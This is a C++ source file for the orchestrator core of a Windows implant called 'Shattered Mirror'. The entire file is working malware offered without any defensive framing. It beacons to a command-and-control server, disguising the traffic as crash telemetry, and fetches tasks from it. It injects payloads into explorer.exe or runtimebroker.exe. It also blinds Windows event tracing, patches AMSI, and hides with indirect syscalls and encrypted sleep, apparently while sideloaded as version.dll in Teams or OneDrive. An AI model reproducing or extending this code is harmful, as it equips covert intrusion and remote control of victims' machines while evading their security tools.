/*=============================================================================
 * Shattered Mirror v1 — Orchestrator: Atom Manager Core
 *
 * The brain of the Orchestrator. 
 * Manages the lifecycle of Atoms and their inter-process communication.
 * Provides detailed verification and logging for every action.
 *===========================================================================*/

#include "AtomManager.h"
#include "Config.h"
#include "Logger.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "../Evasion_Suite/include/stack_encrypt.h"
#include "../Evasion_Suite/include/etw_blind.h"
#include "../Atoms/Atom_08_Proc.h"
#include <cstdio>
#include <string>
#include <vector>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

extern SYSCALL_TABLE g_SyscallTable;

/* Global Session Encryption Key for IPC */
static BYTE s_SessionKey[16] = { 0 };

/* Atom Registry */
static ATOM_RECORD s_Atoms[MAX_ATOMS] = { 0 };
static DWORD       s_dwAtomCount      = 0;

/* External AMSI bypass trigger */
extern BOOL InstallAMSIBypass(void);

/*---------------------------------------------------------------------------
 *  C2 Interaction Implementation (Production Grade)
 *-------------------------------------------------------------------------*/

BOOL SendHeartbeat() {
    Logger::Log(NETWORK, "Attempting to send heartbeat beacon to C2...");
    
    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return Logger::Verify("WinHttpOpen", false, "Error Code: " + std::to_string(GetLastError()));

    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    if (!hConnect) { 
        DWORD err = GetLastError();
        WinHttpCloseHandle(hSession); 
        return Logger::Verify("WinHttpConnect", false, "Error Code: " + std::to_string(err)); 
    }

    /* SSL/TLS Settings Mismatch FIX: Use HTTP if not configured for SECURE */
    DWORD dwFlags = (Config::C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, dwFlags);
    if (!hRequest) { 
        DWORD err = GetLastError();
        WinHttpCloseHandle(hConnect); 
        WinHttpCloseHandle(hSession); 
        return Logger::Verify("WinHttpOpenRequest", false, "Error Code: " + std::to_string(err)); 
    }

    /* Inject dynamic PSK ID */
    std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    
    std::string body = "{\"report_id\":\"user_crash_01\",\"diagnostic_blob\":\"heartbeat\"}";

    BOOL bRes = WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
    if (bRes) {
        WinHttpReceiveResponse(hRequest, NULL);
        Logger::Log(SUCCESS, "Heartbeat acknowledged by C2 server.");
    } else {
        Logger::Log(ERROR_LOG, "Heartbeat Send Failure. Error: " + std::to_string(GetLastError()));
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bRes;
}

std::string FetchTask() {
    Logger::Log(INFO, "Fetching active tasking from C2 queue...");
    
    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }

    DWORD dwFlags = (Config::C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v2/telemetry", NULL, NULL, NULL, dwFlags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }

    /* Inject dynamic PSK ID for authentication */
    std::wstring headers = L"X-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL bRes = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    std::string result = "";

    if (bRes && WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD dwSize = 0;
        WinHttpQueryDataAvailable(hRequest, &dwSize);
        if (dwSize > 0) {
            char* pBuf = new char[dwSize + 1];
            DWORD dwRead = 0;
            if (WinHttpReadData(hRequest, pBuf, dwSize, &dwRead)) {
                pBuf[dwRead] = '\0';
                result = pBuf;
                Logger::Log(SUCCESS, "Received task payload: " + result);
            }
            delete[] pBuf;
        } else {
            Logger::Log(INFO, "Server queue empty. No pending tasks (204).");
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

void SendTaskResult(std::string result) {
    Logger::Log(INFO, "Reporting task execution result to C2...");
    
    WCHAR wDomain[256] = { 0 };
    MultiByteToWideChar(CP_ACP, 0, Config::C2_DOMAIN, -1, wDomain, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, wDomain, (INTERNET_PORT)Config::C2_PORT, 0);
    
    DWORD dwFlags = (Config::C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/telemetry", NULL, NULL, NULL, dwFlags);

    std::wstring headers = L"Content-Type: application/json\r\nX-Telemetry-ID: " + std::wstring(Config::PSK_ID, Config::PSK_ID + strlen(Config::PSK_ID)) + L"\r\n";
    std::string body = "{\"report_id\":\"task_result_01\",\"diagnostic_blob\":\"" + result + "\"}";
    
    WinHttpSendRequest(hRequest, headers.c_str(), -1, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

BOOL SpawnAtomFromTask(std::string json) {
    Logger::Log(ATOM_EVENT, "Parsing task for Atom injection...");
    
    DWORD dwTargetPid = FindTargetProcess(djb2_hash_ct("explorer.exe"));
    if (dwTargetPid == 0) dwTargetPid = FindTargetProcess(djb2_hash_ct("runtimebroker.exe"));
    
    if (dwTargetPid != 0) {
        Logger::Log(SUCCESS, "Found target host process (PID: " + std::to_string(dwTargetPid) + ")");
        BOOL bInjected = InjectPayloadSectionMap(dwTargetPid, (const BYTE*)json.c_str(), json.length());
        if (Logger::Verify("Process Injection", bInjected)) {
            Logger::Log(SUCCESS, "Atom successfully running in host process.");
            return true;
        }
    } else {
        Logger::Log(ERROR_LOG, "Could not find suitable host process for injection.");
    }
    return FALSE;
}

/*---------------------------------------------------------------------------
 *  InitAtomManager
 *-------------------------------------------------------------------------*/
BOOL InitAtomManager(void) {
    Logger::Log(INFO, "Initializing Orchestrator subsystems...");
    
    if (!Logger::Verify("Syscall Table Init", InitSyscallTable(&g_SyscallTable))) return FALSE;

    if (Config::ENABLE_ETW_BLIND) {
        Logger::Log(INFO, "Blinding Event Tracing for Windows (ETW)...");
        BlindETW(&g_SyscallTable);
    }

    if (Config::ENABLE_AMSI_BYPASS) {
        Logger::Log(INFO, "Patching AMSI.dll to bypass memory scans...");
        InstallAMSIBypass();
    }

    DeriveEncryptionKey(s_SessionKey, sizeof(s_SessionKey));
    Logger::Log(SUCCESS, "Local session encryption keys derived.");

    for (int i = 0; i < MAX_ATOMS; i++) {
        s_Atoms[i].Status = ATOM_STATUS_UNINITIALIZED;
    }
    s_dwAtomCount = 0;

    return TRUE;
}

/*---------------------------------------------------------------------------
 *  OrchestratorMain — Main Loop
 *-------------------------------------------------------------------------*/
DWORD WINAPI OrchestratorMain(LPVOID lpParam) {
    Logger::Log(INFO, "--- SHATTERED MIRROR: ORCHESTRATOR ONLINE ---");

    if (!InitAtomManager()) {
        Logger::Log(ERROR_LOG, "Crushing Orchestrator due to initialization failure.");
        Logger::Shutdown();
        return 1;
    }

    SendHeartbeat();

    std::string taskJson;
    while (TRUE) {
        /* Obfuscated Sleep using Stack Encryption */
        SLEEP_CONFIG sleepCfg = { 0 };
        sleepCfg.dwSleepMs = 15000;
        sleepCfg.bStackSpoof = Config::ENABLE_STACK_SPOOF;
        
        /* FIX: Must use the base of OUR DLL, not the host process (Teams/OneDrive) */
        sleepCfg.pImplantBase = GetModuleHandleW(L"version.dll"); 
        
        Logger::Log(INFO, "Entering Obfuscated Sleep (15s)... Stack encrypted to evade scanners.");
        ObfuscatedSleep(&sleepCfg, &g_SyscallTable);

        taskJson = FetchTask();
        if (!taskJson.empty() && taskJson != "NO_TASK") {
            if (taskJson.find('{') != std::string::npos) {
                if (SpawnAtomFromTask(taskJson)) {
                    SendTaskResult("Atom Injected Successfully.");
                }
            }
        }

        /* Verify Health of Active Atoms */
        for (int i = 0; i < MAX_ATOMS; i++) {
            if (s_Atoms[i].Status == ATOM_STATUS_RUNNING) {
                DWORD dwAvail = 0;
                if (PeekNamedPipe(s_Atoms[i].hPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
                    IPC_MESSAGE msg = { 0 };
                    if (IPC_ReceiveMessage(s_Atoms[i].hPipe, &msg, s_SessionKey, sizeof(s_SessionKey))) {
                        if (msg.CommandId == CMD_HEARTBEAT) s_Atoms[i].dwLastHeartbeat = GetTickCount();
                    }
                }

                if ((GetTickCount() - s_Atoms[i].dwLastHeartbeat) > 120000) {
                    Logger::Log(ERROR_LOG, "Atom heartbeat TIMEOUT. Atom assumed DEAD.");
                    s_Atoms[i].Status = ATOM_STATUS_DEAD;
                    CloseHandle(s_Atoms[i].hPipe);
                }
            }
        }
    }

    Logger::Shutdown();
    return 0;
}
